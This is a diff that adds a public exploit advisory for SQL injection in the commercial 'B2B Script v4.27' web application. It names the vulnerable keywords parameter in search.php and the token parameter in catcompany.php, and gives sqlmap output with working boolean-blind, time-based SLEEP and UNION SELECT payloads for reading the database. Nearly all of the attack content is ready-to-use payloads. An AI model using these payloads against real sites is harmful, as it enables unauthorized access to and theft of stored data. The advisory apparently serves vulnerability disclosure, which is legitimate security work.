@@ -1,0 +1,54 @@
+# Vulnerability: B2B Script v4.27 - SQL Injection
+# Date: 18.01.2017
+# Software link: http://itechscripts.com/b2b-script/
+# Demo: http://b2b.itechscripts.com
+# Price: 199$
+# Category: webapps
+# Exploit Author: Dawid Morawski
+# Website: http://www.morawskiweb.pl
+# Contact: dawidmorawski1990@gmail.com
+#######################################
+
+1. Description
+An attacker can exploit this vulnerability to read from the database.
+
+2. SQL Injection / Proof of Concept:
+
+http://localhost/[PATH]/search.php?keywords=[SQL]
+SQLmap outout:
+
+Parameter: keywords (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: keywords=-7908') OR 3641=3641#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: keywords=Products') UNION ALL SELECT
+NULL,CONCAT(0x716b7a7871,0x68634473486965586e6b57754358736b487a43564c6963646e556549454e476177776a5a6a7a4c4c,0x71767a7a71)#
+---
+[INFO] testing MySQL
+ [INFO] confirming MySQL
+ [INFO] the back-end DBMS is MySQL
+
+#########################################
+
+http://localhost/[PATH]/catcompany.php?token=[SQL]
+SQLmap outout:
+
+Parameter: token (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: token=7532a5bfc9e07964f8dddeb95fc584cd965d' AND 9125=9125 AND
+'HhOm'='HhOm
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: token=7532a5bfc9e07964f8dddeb95fc584cd965d' AND SLEEP(5) AND
+'dWKJ'='dWKJ
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: token=-7417' UNION ALL SELECT
+NULL,CONCAT(0x7171707071,0x6a6c6d484f58726e48446167417a66756464445941464844416856527a634a704f4b79647a494654,0x716b786271),NULL,NULL,NULL,NULL--
+aNXq
